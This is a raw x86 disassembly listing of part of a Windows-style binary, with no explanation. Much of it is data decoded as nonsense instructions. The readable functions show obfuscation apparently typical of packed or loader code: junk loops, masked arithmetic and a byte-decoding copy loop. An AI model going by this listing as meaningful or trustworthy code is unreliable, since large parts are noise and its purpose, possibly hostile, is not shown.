  403a3c:	aas    
  403a3d:	inc    esp
  403a3e:	ja     0x403a27
  403a40:	dec    eax
  403a41:	or     dl,dh
  403a43:	xchg   ebx,eax
  403a44:	ins    BYTE PTR es:[edi],dx
  403a45:	mov    esp,0x5f2c3d3f
  403a4a:	out    dx,al
  403a4b:	or     eax,0xed85762a
  403a50:	push   ds
  403a51:	rcr    ebp,1
  403a53:	sbb    DWORD PTR [esi+ebp*4],edi
  403a56:	adc    ebx,DWORD PTR [ebp-0x19589809]
  403a5c:	mov    ch,0x45
  403a5e:	aad    0x7e
  403a60:	cwde   
  403a61:	(bad)  
  403a62:	shl    DWORD PTR [ebx+0x383700d7],1
  403a68:	xor    esi,DWORD PTR [ebx+edx*2-0x2b1aa8ad]
  403a6f:	mov    cl,0x3e
  403a71:	pusha  
  403a72:	mov    eax,ds:0x65fc798
  403a77:	mov    BYTE PTR [ebx+ecx*1],ah
  403a7a:	nop
  403a7b:	out    dx,al
  403a7c:	sbb    eax,0x4bcf832a
  403a81:	adc    al,0xdd
  403a83:	push   es
  403a84:	jo     0x403a91
  403a86:	fst    DWORD PTR [eax-0xe]
  403a89:	fcmovbe st,st(5)
  403a8b:	xchg   edi,eax
  403a8c:	into   
  403a8d:	aas    
  403a8e:	dec    esi
  403a8f:	push   esp
  403a90:	pop    ss
  403a91:	xor    cl,BYTE PTR [edx-0x53]
  403a94:	mov    cs,WORD PTR [edi+0x2a]
  403a97:	das    
  403a98:	aad    0x69
  403a9a:	pop    gs
  403a9c:	adc    DWORD PTR [ebx-0xbb1dc96],ebx
  403aa2:	(bad)  
  403aa3:	std    
  403aa4:	or     ebx,DWORD PTR [esi]
  403aa6:	cmp    edx,DWORD PTR [esi-0x4d]
  403aa9:	push   esp
  403aaa:	jge    0x403add
  403aac:	xchg   esp,eax
  403aad:	in     al,0xb6
  403aaf:	dec    esp
  403ab0:	(bad)  
  403ab1:	cld    
  403ab2:	jmp    0xd0b2:0x330810b7
  403ab9:	xchg   ebx,eax
  403aba:	scas   eax,DWORD PTR es:[edi]
  403abb:	mov    ch,0x77
  403abd:	bnd jae 0x403b22
  403ac0:	mov    ebp,0x3abb9c8f
  403ac5:	ins    BYTE PTR es:[edi],dx
  403ac6:	rcl    ecx,0xa6
  403ac9:	adc    DWORD PTR [eax+0x69],ebx
  403acc:	lea    edx,[esp+edi*2+0x39]
  403ad0:	imul   esp,DWORD PTR [ebx+0x2e73b2f1],0xffffff98
  403ad7:	and    DWORD PTR [esi+0x58c37a25],esi
  403add:	shl    BYTE PTR [edx+ebx*2+0x40467c08],0x60
  403ae5:	(bad)  
  403ae6:	dec    esi
  403ae7:	stos   BYTE PTR es:[edi],al
  403ae8:	cdq    
  403ae9:	sub    dh,BYTE PTR [edx-0x809046b]
  403aef:	dec    ecx
  403af0:	cmp    ebx,0x37
  403af3:	pop    esp
  403af4:	adc    BYTE PTR [edx-0x14cdcf0],dh
  403afa:	iret   
  403afb:	sahf   
  403afc:	mov    ecx,0xca3c7f40
  403b01:	mov    dh,0x5
  403b03:	push   es
  403b04:	loope  0x403b6c
  403b06:	daa    
  403b07:	sbb    ecx,esp
  403b09:	push   0x6288c54b
  403b0e:	mov    esi,0xe281b618
  403b13:	push   0x17
  403b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b16:	ret    0xe4d2
  403b19:	es mov ebp,0xfcf3fa50
  403b1f:	lds    edi,FWORD PTR ds:0xd1558e19
  403b25:	int3   
  403b26:	ins    DWORD PTR es:[edi],dx
  403b27:	pushf  
  403b28:	xlat   BYTE PTR ds:[ebx]
  403b29:	pushf  
  403b2a:	scas   al,BYTE PTR es:[edi]
  403b2b:	xor    BYTE PTR [ecx],bl
  403b2d:	jmp    0xe5be:0x91f809b9
  403b34:	std    
  403b35:	mov    ch,0x8f
  403b37:	push   ecx
  403b38:	push   edx
  403b39:	out    dx,al
  403b3a:	add    edx,eax
  403b3c:	rcr    DWORD PTR [ecx],cl
  403b3e:	xchg   ebp,eax
  403b3f:	sbb    ch,BYTE PTR [edx-0x11f1717c]
  403b45:	in     al,0x7a
  403b47:	(bad)  
  403b49:	(bad)  
  403b4a:	pop    ebx
  403b4b:	pop    ecx
  403b4c:	cli    
  403b4d:	xor    al,0xb0
  403b4f:	in     eax,dx
  403b50:	adc    bh,BYTE PTR [eax+0x6f]
  403b53:	sub    al,0x3
  403b55:	pop    ebx
  403b56:	mov    ebx,DWORD PTR [edx+0x44ced59]
  403b5c:	sahf   
  403b5d:	in     eax,0xc3
  403b5f:	pushf  
  403b60:	mov    esp,0xa225099e
  403b65:	xor    BYTE PTR [ecx-0x11e03e1e],cl
  403b6b:	loope  0x403b98
  403b6d:	add    eax,0xce1be61
  403b72:	sti    
  403b73:	xchg   esi,eax
  403b74:	and    ebx,DWORD PTR ds:0xf2e63d57
  403b7a:	fwait
  403b7b:	mov    eax,ds:0x4ed31bb9
  403b80:	or     al,BYTE PTR ds:0x6d03b8df
  403b86:	sahf   
  403b87:	mov    dl,0xa
  403b89:	pop    esi
  403b8a:	int3   
  403b8b:	xor    eax,0xd3a264a2
  403b90:	push   0xffffffef
  403b92:	add    esp,DWORD PTR [edx+0x937e9c0]
  403b98:	push   es
  403b99:	lahf   
  403b9a:	inc    ebp
  403b9b:	add    esi,DWORD PTR [ebx-0x60]
  403b9e:	ss (bad) 
  403ba0:	mov    al,ds:0xfc279da0
  403ba5:	pop    es
  403ba6:	ja     0x403b88
  403ba8:	jns    0x403bdd
  403baa:	enter  0x3af4,0xac
  403bae:	xor    dl,BYTE PTR [esi]
  403bb0:	pushf  
  403bb1:	call   0xcd42424d
  403bb6:	hlt    
  403bb7:	fchs   
  403bb9:	call   0x7585:0x6a1f1eac
  403bc0:	ds inc esi
  403bc2:	xor    ebx,eax
  403bc4:	cmp    BYTE PTR [ecx-0x4c],cl
  403bc7:	test   DWORD PTR [ebx+0x1ec99855],0x1a61ca69
  403bd1:	xor    eax,0x73d8934
  403bd6:	jnp    0x403bdd
  403bd8:	rcr    BYTE PTR [edi+0x1cbfe11a],1
  403bde:	and    bh,BYTE PTR [esi]
  403be0:	xor    BYTE PTR [esi+0x25],dl
  403be3:	push   0xcf092c1
  403be8:	iret   
  403be9:	mov    edi,0x37df999c
  403bee:	xchg   ebx,eax
  403bef:	push   esp
  403bf0:	out    0xf0,al
  403bf2:	retf   0xbf78
  403bf5:	xor    eax,0x5ba33eab
  403bfa:	aaa    
  403bfb:	jp     0x403b97
  403bfd:	call   0x4f521f28
  403c02:	cwde   
  403c03:	dec    ebx
  403c04:	jle    0x403bfc
  403c06:	call   0x49567d62
  403c0b:	inc    edi
  403c0c:	jl     0x403c0b
  403c0e:	into   
  403c0f:	and    ebp,eax
  403c11:	xchg   esp,eax
  403c12:	jge    0x403bea
  403c14:	fldenv [ebx+eiz*4+0x738ab1c6]
  403c1b:	outs   dx,BYTE PTR ds:[esi]
  403c1c:	imul   ebp,DWORD PTR [ecx-0x67bf87ba],0x73
  403c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c24:	aas    
  403c25:	sar    esp,cl
  403c27:	test   BYTE PTR [edx-0x2],0x32
  403c2b:	lds    ebx,FWORD PTR [edi+0x5a78980]
  403c31:	or     edi,esi
  403c33:	jno    0x403c70
  403c35:	or     al,0x22
  403c37:	push   ecx
  403c38:	or     eax,DWORD PTR [eax-0x1a63001c]
  403c3e:	push   edx
  403c3f:	aad    0x3a
  403c41:	(bad)  
  403c42:	fcom   QWORD PTR [ecx+0x1134ddb5]
  403c48:	xor    ah,dh
  403c4a:	dec    edx
  403c4b:	mov    DWORD PTR [eax-0x19559954],edx
  403c51:	adc    eax,0xdc62c896
  403c56:	mov    esp,0x971850f0
  403c5b:	jae    0x403c24
  403c5d:	jecxz  0x403c9e
  403c5f:	sub    al,0x76
  403c61:	and    BYTE PTR [esp+ebp*2],dl
  403c64:	mov    ah,0x7e
  403c66:	mov    ah,0xcb
  403c68:	jae    0x403c21
  403c6a:	stc    
  403c6b:	or     al,0xd3
  403c6d:	inc    esp
  403c6e:	mov    ah,BYTE PTR [ecx]
  403c70:	jl     0x403ca9
  403c72:	popa   
  403c73:	sub    bl,BYTE PTR [esi-0x7fc46a51]
  403c79:	fdivr  st,st(4)
  403c7b:	push   ss
  403c7c:	cdq    
  403c7d:	push   es
  403c7e:	fiadd  DWORD PTR [ecx]
  403c80:	xor    ecx,eax
  403c82:	mov    DWORD PTR [ebp+0x8],ecx
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff1f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x2d9c947b
  4042a6:	mov    es,WORD PTR [edx]
  4042a8:	or     DWORD PTR [edx],ebx
  4042aa:	pop    edi
  4042ab:	bound  esp,QWORD PTR [edx+0x2a]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x22]
  4042b2:	sbb    eax,DWORD PTR [ebx]
  4042b4:	sbb    dh,BYTE PTR [esi]
  4042b6:	sub    DWORD PTR [esi-0x53],ecx
  4042b9:	fmul   DWORD PTR [ebp+0x42fa8dd]
  4042bf:	and    BYTE PTR [eax-0x25dce6a2],cl
  4042c5:	push   ss
  4042c6:	enter  0xe0b4,0x35
  4042ca:	xchg   ebp,eax
  4042cb:	xor    eax,0x5c482426
  4042d0:	fwait
  4042d1:	jecxz  0x4042c0
  4042d3:	adc    BYTE PTR [eax+0xbcbec75],0x79
  4042da:	mov    dh,0x59
  4042dc:	data16 clc 
  4042de:	int    0xf0
  4042e0:	push   DWORD PTR [ebp+0x4]
  4042e3:	aas    
  4042e4:	mov    ah,0x6c
  4042e6:	cmp    eax,0xc183e0b9
  4042eb:	scas   al,BYTE PTR es:[edi]
  4042ec:	xchg   edi,eax
  4042ed:	pop    edx
  4042ee:	mov    ds:0x7b2c5716,al
  4042f3:	ret    
  4042f4:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f6:	loop   0x40436d
  4042f8:	or     BYTE PTR [ebx*8+0x44a14d78],bl
  4042ff:	cmp    ch,BYTE PTR [esp+edx*1+0x18]
  404303:	jle    0x404363
  404305:	pop    ecx
  404306:	dec    ebx
  404307:	adc    ecx,ebp
  404309:	add    al,0x6b
  40430b:	jns    0x404346
  40430d:	lock or esi,ebx
  404310:	mov    dl,0x5
  404312:	cs or  ecx,ecx
  404315:	jno    0x404323
  404317:	cdq    
  404318:	stos   DWORD PTR es:[edi],eax
  404319:	out    dx,al
  40431a:	jbe    0x404312
  40431c:	into   
  40431d:	mov    eax,0x702f4114
  404322:	js     0x404302
  404324:	sub    al,0xf9
  404326:	inc    edx
  404327:	fild   WORD PTR [ebp-0x9986809]
  40432d:	icebp  
  40432e:	xchg   BYTE PTR [ebp-0x6cf920a7],cl
  404334:	dec    edx
  404335:	cmp    BYTE PTR [ecx-0x76336860],dl
  40433b:	cmp    bl,al
  40433d:	sub    BYTE PTR [bx+di+0x2167],0xf2
  404343:	test   eax,0x167b2bb0
  404348:	pushf  
  404349:	icebp  
  40434a:	jge    0x4042f3
  40434c:	int    0x53
  40434e:	test   DWORD PTR [ecx-0x157addac],edx
  404354:	sub    eax,0x846b09a9
  404359:	dec    edi
  40435a:	sub    ch,cl
  40435c:	mov    BYTE PTR [edi],al
  40435e:	dec    ebp
  40435f:	(bad)  
  404360:	mov    edx,0x733985d2
  404365:	xor    eax,DWORD PTR [edi+0x760c0f5e]
  40436b:	repnz (bad) 
  40436e:	and    DWORD PTR [ecx],ecx
  404370:	jnp    0x4043cc
  404372:	push   edx
  404373:	int3   
  404374:	(bad)  
  404375:	bound  edi,QWORD PTR [edx-0x74]
  404378:	les    ecx,FWORD PTR [ecx-0x20e401f6]
  40437e:	pop    esp
  40437f:	add    BYTE PTR [ecx-0x2e],dl
  404382:	push   ecx
  404383:	push   0xf4d72437
  404388:	bound  esp,QWORD PTR [ebp-0x41]
  40438b:	int    0xfb
  40438d:	mov    cl,0x3b
  40438f:	mov    esi,0xabb1ac5
  404394:	sbb    eax,0x3a89eb59
  404399:	not    DWORD PTR ds:0x4eba74f3
  40439f:	lods   al,BYTE PTR ds:[esi]
  4043a0:	sub    BYTE PTR [edx+0x5],ah
  4043a3:	mov    esi,0x4f8f9bfc
  4043a8:	iret   
  4043a9:	fisubr DWORD PTR [edi]
  4043ab:	daa    
  4043ac:	xchg   ebp,eax
  4043ad:	nop
  4043ae:	lahf   
  4043af:	mov    ecx,0xf9b9c2b2
  4043b4:	jge    0x40434f
  4043b6:	test   al,0x1a
  4043b8:	mov    ebp,edi
  4043ba:	xchg   ebp,eax
  4043bb:	cmp    BYTE PTR [edx-0x20334499],0xeb
  4043c2:	push   esp
  4043c3:	xchg   edi,eax
  4043c4:	bnd jbe 0x40434d
  4043c7:	push   ebp
  4043c8:	fadd   QWORD PTR [ebx]
  4043ca:	xor    DWORD PTR [edi-0x23],eax
  4043cd:	jmp    0x404386
  4043cf:	pop    edi
  4043d0:	jo     0x40441f
  4043d2:	imul   eax,DWORD PTR [ebp-0x1195d5e3],0xa23ef8f6
  4043dc:	cmc    
  4043dd:	jmp    0x404395
  4043df:	cmp    DWORD PTR [eax-0x6954fc47],eax
  4043e5:	mov    cl,dh
  4043e7:	mov    eax,ds:0xb2847ad6
  4043ec:	js     0x40439c
  4043ee:	dec    esi
  4043ef:	sbb    BYTE PTR [ecx+0x538ece32],bh
  4043f5:	push   edx
  4043f6:	mov    al,ds:0x5ef94265
  4043fb:	pop    edi
  4043fc:	stos   DWORD PTR es:[edi],eax
  4043fd:	and    DWORD PTR [edx+0x3c],edi
  404400:	add    BYTE PTR ds:0x2f076936,bh
  404406:	neg    esp
  404408:	pop    ss
  404409:	sti    
  40440a:	fcmovnb st,st(1)
  40440c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40440d:	adc    al,BYTE PTR [edx]
  40440f:	retf   
  404410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404411:	jns    0x4043a0
  404413:	xlat   BYTE PTR ds:[ebx]
  404414:	push   ds
  404415:	push   cs
  404416:	mov    dh,0x6e
  404418:	fs jp  0x404416
  40441b:	pusha  
  40441c:	sbb    DWORD PTR [ebp+edx*1-0x16],esi
  404420:	outs   dx,DWORD PTR ds:[esi]
  404421:	sti    
  404422:	push   ebx
  404423:	std    
  404424:	cmp    al,0xdc
  404426:	jmp    0x5c2:0x114eecf9
  40442d:	xchg   DWORD PTR [edi-0x346b0e55],ebx
  404433:	mov    BYTE PTR [edx-0x581ef07f],ah
  404439:	rcr    DWORD PTR [edx-0x11f6d564],cl
  40443f:	dec    ebp
  404440:	mov    ds:0xa323d61a,eax
  404445:	shr    BYTE PTR [edx+0x16],1
  404448:	mov    bl,0x5b
  40444a:	sar    esi,cl
  40444c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40444d:	add    BYTE PTR [ecx-0x1a],dh
  404450:	das    
  404451:	or     dl,BYTE PTR [ecx-0x7e483aba]
  404457:	test   al,0xfd
  404459:	mov    esp,0xad592b66
  40445e:	nop
  40445f:	inc    esi
  404460:	enter  0x66a7,0x1f
  404464:	cwde   
  404465:	mov    dl,0xd2
  404467:	lods   al,BYTE PTR ds:[esi]
  404468:	imul   DWORD PTR [edx-0x1190e5b1]
